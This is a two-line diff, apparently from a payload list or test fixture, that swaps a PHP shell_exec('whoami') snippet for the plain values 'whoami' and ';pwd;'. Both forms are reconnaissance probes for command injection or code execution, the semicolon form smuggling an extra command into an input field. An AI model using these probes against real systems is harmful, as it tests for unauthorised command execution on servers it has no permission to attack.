@@ -1,1 +1,2 @@
-<?php echo shell_exec("whoami");?>
+whoami
+;pwd;
